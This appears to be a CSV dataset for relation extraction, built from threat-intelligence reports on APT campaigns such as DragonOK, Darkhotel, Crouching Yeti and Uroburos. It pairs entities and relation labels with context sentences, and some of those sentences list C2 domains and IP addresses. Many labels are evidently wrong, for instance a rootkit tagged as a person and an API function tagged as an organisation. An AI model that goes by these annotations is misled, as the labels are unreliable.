"FileName","RelationType","Entity1Mention","Entity1Type","Entity2Mention","Entity2Type","Context"
"fireeye-operation-quantum-entanglement","hasattacktime","Moafee","ORG","between July 31, 2013 and August 8, 2013","DATE","This group has used similar malware to the Moafee group described above . Specifically , we observed DragonOK employing PoisonIvy , Nflog , Mongall , CT , and NewCT . Like the Moafee group , we observed the DragonOK group running an HTRAN proxy client on one of their front - end command and control servers . For approximately one week , between July 31 , 2013 and August 8 , 2013 , the domain www.ndbssh[.]com served as a command and control server for Mongall payloads distributed by the DragonOK group . "
"fireeye-operation-quantum-entanglement","hasattacklocation","Moafee","ORG","Taiwan","GPE","This observation may reveal that the Moafee group is physically located in this province . Campaign # 2 : DragonOK We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan . "
"Targeted_Attacks_Lense_NGO","hasproduct","Citizenlab","ORG","Surtr","PRODUCT","We also showed that the Surtr and APT.9002 clusters corresponded to malware that Citizenlab and FireEye identifed as having targeted the Tibetan community , as well as other political and industrial organizations [ 7 , 9 ] . "
"Darwin_fav_APT_Group","hasattacktime","RIPTIDE","ORG","May 2014","DATE","In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth . The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 . "
"GData_Uroburos_RedPaper_EN_v1","hasattacktime","Uroburos","PERSON","2011","DATE","We found Uroburos samples with a resource in Russian language : In case someone from the audience of this report notices an infection caused by the Uroburos rootkit and needs help , would like to receive further technical information or would like to contribute any information about this case , please feel free to contact us by email using the following mailbox : intelligence@gdata.de Conclusion The Uroburos rootkit is one of the most advanced rootkits we have ever analyzed . The oldest driver we identified was compiled in 2011 , which means that the campaign remained undiscovered for at least three years . "
"darkhotel_kl_07.11","hasattacklocation","thousands","CARDINAL","Japan","GPE","self-makeups.com self-makingups.com sourcecodecenter.org supportforum.org updatewifis.dyndns-wiki.com Victim locations - KSN and Sinkhole Data KSN Data our Kaspersky Security Network detected Darkhotel infections across thousands of machines , mostly related to the Darkhotel p2p campaigns . These geolocation estimates probably provide the most accurate picture of where Darkhotel activity is occurring . Here is a pie chart to better visualize the proportions of attack activity throughout the world . As you can see , over 90 % of it occurs in the top five countries : Japan , followed by Taiwan , China , Russia and Korea . "
"Cylance_Operation_Cleaver_Report","hasattacklocation","TinyZBot","ORG","United Kingdom","GPE","This allowed supplemental tools to keep TinyZBot running by enumerating every process and checking if the process ID and mutex prefix existed . If no mutex and process pair was located , another TinyZBot instance would be started . Command and Control Servers  88.150.214.168 , United Kingdom , microsoftactiveservices(dot)com  95.211.241.249 , Amsterdam , Noord - Holland , Netherlands  88.150.214.166 , United Kingdom  173.192.144.68 , Seattle , Washington , USA  188.227.180.213 , United Kingdom  192.111.145.197 , Rochester , New York , USA Backdoors "
"HPSR SecurityBriefing_Episode16_NorthKorea","targets","Masahiro Namikawa","PERSON","Mangyongbong-92","PRODUCT","Many members of the Kodo - kai , Yamaguchi - gumi ’s ruling faction , are Korean - Japanese , with ties to North Korea.178 Masahiro Namikawa , leader of the drug trafficking Seido - kai yakuza organization , also has ties to the Chongryon.179 177 http://japandailypress.com/religious-group-that-bought-north-korean-embassy-building-has-mob-ties-0826568/ 178 http://culturmag.de/crimemag/jake-adelstein-the-yakuza-2/20212 179 http://www.thedailybeast.com/articles/2013/06/25/the-great-japanese-gang-wars.html 180 http://news.bbc.co.uk/2/hi/asia-pacific/2958968.stm 181 http://www.washingtontimes.com/news/2006/oct/16/20061016-122859-4745r/ 182 http://www.ibtimes.com/north-koreas-international-network-restaurants-used-gain-hard-currency-espionage-1427242 183 http://www.outsideonline.com/outdoor-adventure/politics/Did-North-Korea-Kidnap-This-American-Hiker.html?utm_content=buffer6bd46&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer 184 http://freebeacon.com/national-security/north-koreas-overseas-restaurants-used-for-espionage-and-gaining-hard-currency/ The Chongryon operate at least two websites , chongryon.com , which is in Japanese , and korea-np.co.jp . WHOIS records for chongryon.com indicate that it was registered by “ guanin o ” using the email address park2@mac.com . The WHOIS information for korea-np.co.jp . shows that it was registered by Choson Shinbo Company Inc. The WHOIS records for these sites can be found in Appendix A. Additionally , the Chongryon operate a ferry called the Mangyongbong-92 , the only direct transit from Japan to North Korea . "
"EB-YetiJuly2014-Public","hasproduct","XDP","ORG","DLL","PRODUCT","This exploit drops the Havex loader DLL , which is stored in an encrypted form in the XDP file . "
"ZoxPNG_Full_Analysis-Final","hasproduct","Process32Next","ORG","WTSEnumerateProcesses","PRODUCT","When activated , the command handler obtains a list of active processes on the victim ’s machine by calling WTSEnumerateProcesses . By using WTSEnumerateProcesses instead of the more common Process32First and Process32Next functions , the Enumerate Processes command can also list processes associated with terminal server sessions . "
"unveilingthemask_v1.0","hascharacteristics","Ugly Face","WORK_OF_ART","1","CARDINAL","The name "" Mask "" comes from the Spanish slang word "" Careto "" ( "" Ugly Face "" or “ Mask ” ) which the authors included in some of the malware modules . Figure 1 . "
"group-3279-targets-the-video-game-industry","hasattacklocation","CreditCardFucker","ORG","China","GPE","Twitter accounts such as FireEye and SecurityTube , many penetration testers , and offensive - security Twitter accounts such as Nikita Tarajanov from Russia and a self - described "" Botmaster , TrueCrober , CreditCardFucker , Fraudmaster "" based in "" cardaland "" who posts in Russian . Based upon the geolocation data associated with Weibo posts , the Sincoder ( 2bcoder ) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen , China as of this publication , and may be af.liated with the Wuhan University of Technology . "
"ThreatConnect_Operation_Arachnophobia_Report","hasattacktime","Cyber Squared","ORG","the months","DATE","In the months following the disclosure , we identified new activity . Cyber Squared partnered with experts at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its Operation “ Arachnophobia ” . "
"EB-YetiJuly2014-Public","authored","Crouching Yeti","PERSON","dozens","CARDINAL","They used dozens of compromised servers as Command and Control domains with a simple , but effective , PHP backend . However there is an interesting connection with this group and the LightsOut Exploit Kit for the distribution of its malware in some waterholing attacks . We believe they are likely its only operators as of June 2014 . Thanks to the monitoring of several of the Command and Control domains used by the group , we were able to identify several victims . This victims ’ list reinforces the interests shown by the Crouching Yeti actor in strategic targets , but also shows the interest of the group in many other not - so - obvious institutions . "
"HPSR SecurityBriefing_Episode16_NorthKorea","hasproduct","SIMNA","ORG","Intelligent Locker","PRODUCT","The university reportedly developed the Intelligent Locker hard disc protection program , Worluf Antivirus , SIMNA ( simulation and system analysis program ) , a war games program , a hepatitis diagnosis and prescription system , and a C++ program development tool called FC 2.0.237 Kim Il - sung University also has programs focusing on nuclear research.238 Kim Chaek University of Technology was established in 1948 . "
"fireeye-operation-quantum-entanglement","hasattacklocation","DragonOK","ORG","Japan","GPE","One such Japanese - language decoy documents used by the “ DragonOK ” group is 6 http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html Figure 2 : Email containing “ 888888 ” password in body with password - protected document attached shown below . It appears to be a resume of someone from Kyoto University in Japan who was involved in English language studies . "
"EB-YetiJuly2014-Public","indicates","Havex Trojan","PRODUCT","three","CARDINAL","To infect the victims , the attackers rely on three methods : • Spearphishing using PDF documents embedded with a flash exploit ( CVE-2011 - 0611 ) • Trojanized software installers • Waterhole attacks using a variety of re - used exploits During the attacks , the Crouching Yeti uses several malware / Trojans , which exclusively infect Windows systems : • Havex Trojan • Sysmain Trojan • "
"HPSR SecurityBriefing_Episode16_NorthKorea","targets","U.S. Independence Day.314","ORG","Operation Troy","PRODUCT","The attacks coincided with U.S. Independence Day.314 315 Other malware used for Operation Troy was also planted . "
